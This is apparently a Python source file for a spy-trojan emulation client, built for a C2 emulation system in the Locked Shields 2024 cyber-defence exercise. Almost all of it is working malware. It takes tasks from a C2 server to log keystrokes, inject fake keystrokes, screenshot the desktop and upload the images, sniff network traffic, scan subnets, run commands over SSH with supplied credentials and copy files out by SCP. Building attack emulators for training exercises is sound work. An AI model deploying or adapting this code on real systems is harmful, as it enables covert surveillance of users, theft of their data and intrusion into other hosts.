#-----------------------------------------------------------------------------
# Name:        spyTrojan.py
#
# Purpose:     This spy trojan emulation malware is modified from the backdoor 
#              trojan program <backdoorTrojan.py> by adding the network scanning
#              function, traffic eavesdropping, ssh connection, scp file transfer, 
#              keyboard logging function, fake keyboard event generate function and 
#              user's desktop screen shot function.
#
# Author:      Yuancheng Liu
#
# Version:     v_0.1.2
# Created:     2023/12/19
# Copyright:   Copyright (c) 2023 LiuYuancheng
# License:     MIT License
#-----------------------------------------------------------------------------
""" Program design: 
    We want to implement a spy backdoor malware program which can be linked in our 
    C2 emulation system (https://github.com/LiuYuancheng/Python_Malwares_Repo/tree/main/src/c2Emulator)
    to finish the stage 1 attack, This program will be used in the LS2024
    cyber event : Lock Shield 2024
"""
import os
import time
from datetime import datetime
from PIL import Image
import pyscreenshot as ImageGrab
import ConfigLoader
import c2MwUtils
import nmapUtils
import keyEventActors
from tsharkUtils import trafficSniffer
from SCPconnector import scpConnector
from SSHconnector import sshConnector

CONFIG_FILE_NAME = 'spyTrojanCfg.txt'

print("Current working directory is : %s" % os.getcwd())
dirpath = os.path.dirname(__file__)
print("Current source code location : %s" % dirpath)

# Init the config loader program.
gConfigPath = os.path.join(dirpath, CONFIG_FILE_NAME)
iConfigLoader = ConfigLoader.ConfigLoader(gConfigPath, mode='r')
if iConfigLoader is None:
    print("Error: The config file %s is not exist. Program exit!" %str(gConfigPath))
    exit()
CONFIG_DICT = iConfigLoader.getJson()

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class spyTrojan(c2MwUtils.c2TestMalware):

    def __init__(self, malwareID, ownIp, c2Ipaddr, c2port=5000, reportInt=10, tasksList=None, c2HttpsFlg=False, cmdTDFlg=False) -> None:
        """ Init example:   client = falseCmdInjector(malwareID, ownIP, c2Ipaddr, 
                              c2port=c2Port, reportInt=c2RptInv, tasksList=taskList, c2HttpsFlg=c2HttpsFlg)
        Args:
            malwareID (str): malware id
            ownIp (str): malware ip address
            c2Ipaddr (str): c2 server IP address
            reportInt (int, optional): time interval between 2 report to c2. Defaults to 10 sec.
            tasksList (list of dict, optional): refer to <programRcd> taskList. Defaults to None.
            c2HttpsFlg (bool, optional): flag to identify whether connect to c2 via https. Defaults to False.
            cmdTDFlg (bool, optional): flag to identify whether run the command execution task 
                in the command runner's sub-thread. Defaults to False.
        """
        super().__init__(malwareID, ownIp, c2Ipaddr, c2port=c2port, reportInt=reportInt, \
                         tasksList=tasksList, c2HttpsFlg=c2HttpsFlg, cmdTDFlg=cmdTDFlg)
        print("SpyTrojan init finished.") 

    #-----------------------------------------------------------------------------
    def _initActionHandlers(self):
        """ Init the special malicious action handling module.
        """
        # Init the networkScanner module.
        self.netScanner = nmapUtils.nmapScanner()
        # Init the keyboard event actor module. 
        self.keyLogger = keyEventActors.keyEventActor()
        # Init the network sniffer for eavesdropping / mirroring module.
        self.sniffer = trafficSniffer()
    
    #-----------------------------------------------------------------------------
    def _startSubThreads(self):
        self.keyLogger.start()

    #-----------------------------------------------------------------------------
    def _handleSpecialTask(self, taskDict):
        """ Define all the special task handling function call here.
            Args:
                taskDict (dict): _description_
            Returns:
                _type_: task execution result string.
        """
        resultStr = 'taskTypeNotFound'
        if taskDict['taskType'] == 'scanSubnet':
            resultStr = self.scanSubnet(taskDict['taskData'])
        if taskDict['taskType'] == 'keyEvent':
            resultStr = self.handleKeyEvent(taskDict['taskData'])
        if taskDict['taskType'] == 'screenShot':
            resultStr = self.uploadScreenShot(taskDict['taskData'])
        if taskDict['taskType'] == 'scpFile':
            resultStr = self.scpFile(taskDict['taskData'])
        if taskDict['taskType'] == 'sshRun':
            resultStr = self.sshRunCmd(taskDict['taskData'])
        if taskDict['taskType'] == 'eavesDrop':
            resultStr = self.eavesDrop(taskDict['taskData'])
        return resultStr
    
    #-----------------------------------------------------------------------------
    def eavesDrop(self, taskData):
        """ Eavesdropping the traffic and save in pcap file, then upload to C2.
            Args:
                taskData (str): example: <nic_Name>;<interface_ID>;<captureTimeInterval>
            Returns:
                str: captured file name if eavesdrop successful else error message.
        """
        nicName, interface, timeInt = str(taskData).split(';')
        timeInt = int(timeInt)
        self.sniffer.setNicInfo(nicName, interface)
        now = datetime.now()
        fileName = 'eavesdroping_%s.pcap' % str(now.strftime("%Y_%m_%d_%H_%M_%S"))
        filePath = os.path.join(dirpath, fileName)
        rst = self.sniffer.capture2File(filePath, timeoutInt=timeInt)
        return self.sniffer.getLastCaptureFilePath() if rst else "Error: eavesdroping fail"
        
    #-----------------------------------------------------------------------------
    def sshRunCmd(self, taskData):
        """ SSH login to a remote host and run command.
            Args:
                taskData (str): example: <ip>;<userName>;<password>;<command str>
            Returns:
                _type_: _description_
        """
        try:
            mainInfo = str(taskData).split(';')
            ipaddress = mainInfo[0]
            userName = mainInfo[1]
            passWord = mainInfo[2]
            cmdStr = mainInfo[3]
            mainHost = sshConnector(None, ipaddress, userName, passWord)
            mainHost.addCmd(cmdStr, print)
            mainHost.InitTunnel()
            mainHost.runCmd(interval=0.1)
            mainHost.close()
            return "SSH login and run cmd on target."
        except Exception as err:
            return str(err)

    #-----------------------------------------------------------------------------
    def scpFile(self, taskData):
        """ SCP a file from current host to a remote host.
            Args:
                taskData (_type_): example: <ip>;<userName>;<password>;<file path>
            Returns:
                _type_: _description_
        """
        try:
            mainInfo = str(taskData).split(';')
            ipaddress = mainInfo[0]
            userName = mainInfo[1]
            passWord = mainInfo[2]
            filename = mainInfo[3]
            destInfo = (ipaddress, userName, passWord)
            scpClient = scpConnector(destInfo, showProgress=True)
            uploadFileName = os.path.join(dirpath, filename)
            scpClient.uploadFile(uploadFileName, filename)
            scpClient.close()
            return "SCP file %s to target." %str(filename)
        except Exception as err:
            return str(err)

    #-----------------------------------------------------------------------------
    def scanSubnet(self, taskData):
        """ Scan the targeted subnet.
            Args:
                taskData (str): subnet string example: 10.10.106.0/24
            Returns:
                _type_: _description_
        """
        subnetStr = str(taskData)
        rst = self.netScanner.scanSubnetIps(subnetStr)
        return str(rst)
    
    #-----------------------------------------------------------------------------
    def uploadScreenShot(self, taskData):
        """ Screen shot the user desktop and upload the screen file to C2 hub.
            Args:
                taskData (str): 'None' will auto generate a file name <malwareID>_<timestamp>.png
            Returns:
                _type_: _description_
        """
        filename = self.malwareID+'_'+str(datetime.now().strftime('%H_%M_%S'))+'.png' if taskData == 'None' else taskData
        if not '.png' in filename: filename += '.png'
        filePath = os.path.join(dirpath, filename)
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(filePath)
            self.c2Connector.transferFiles([filePath],uploadFlg=True)
            return "Upload screenshot: %s" % filename
        except Exception as err:
            print("Error: uploadScreenShot() > screen shot capture error: %s " %str(err))
        return "Capture screenshot error"

    #-----------------------------------------------------------------------------
    def handleKeyEvent(self, taskData):
        """ Handle the keyboard event.
            Args:
                taskData (str): <keyboard event cmd key>;<keyboard event paramters>
            Returns:
                _type_: _description_
        """
        cmd, parm = taskData.split(';')
        if cmd == 'startRcd':
            rcdTime = int(parm)
            self.keyLogger.startLogKeyInput(recordTime=rcdTime)
            return "startRcd: %s " % str(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        elif cmd == 'stopRcd':
            self.keyLogger.stopLogKeyInput()
            rcdFile = str(parm)
            if not rcdFile == 'None':
                rcdPath = os.path.join(dirpath, rcdFile)
                try:
                    with open(rcdPath, 'a') as fh:
                        for event in self.keyLogger.getKeyEventList():
                            fh.write(event.to_json())
                except Exception as err:
                    print("Error to create the key log file: %s" %str(err))
                    return "LoginfileError"
            return "stopRcd: %s " % str(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        elif cmd == 'getEvent':
            rstType = str(parm)
            if rstType == 'simple':
                keyStr = str(self.keyLogger.getKeyEventRcdStr())
                print("Return keystr %s to C2" %keyStr)
                return keyStr
            elif rstType == 'detail':
                keyevents = self.keyLogger.getKeyEventList()
                evetList = [event.to_json() for event in keyevents]
                return str(evetList)
        elif cmd == 'clearRcd':
            self.keyLogger.clearRecord()
            return "clearRcd: %s " % str(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        elif cmd == 'typeInStr':
            typeinStr = str(parm)
            self.keyLogger.typeStr(typeinStr)
            return "Finished Type in String."
        else:
            return 'taskTypeNotFound'

    #-----------------------------------------------------------------------------
    def stop(self):
        super().stop()
        self.keyLogger.stop()
        
#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main():
    malwareID = CONFIG_DICT['OWN_ID']
    ownIP = CONFIG_DICT['OWN_IP']
    c2Ipaddr = CONFIG_DICT['C2_IP']
    c2Port = int(CONFIG_DICT['C2_PORT'])
    c2RptInv = int(CONFIG_DICT['C2_RPT_INV'])
    c2HttpsFlg = CONFIG_DICT['C2_HTTPS'] if 'C2_HTTPS' in CONFIG_DICT.keys() else False
    taskList = [
            {
                'taskID': 0,
                'taskType': 'register',
                'StartT': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'repeat': 1,
                'ExPerT': 0,
                'state' : c2MwUtils.TASK_R_FLG,
                'taskData': None
            } ]
    client = spyTrojan(malwareID, ownIP, c2Ipaddr, 
                              c2port=c2Port, reportInt=c2RptInv, tasksList=taskList, c2HttpsFlg=c2HttpsFlg)
    time.sleep(1)
    client.run()
    client.stop()

#-----------------------------------------------------------------------------
if __name__ == '__main__':
    main()
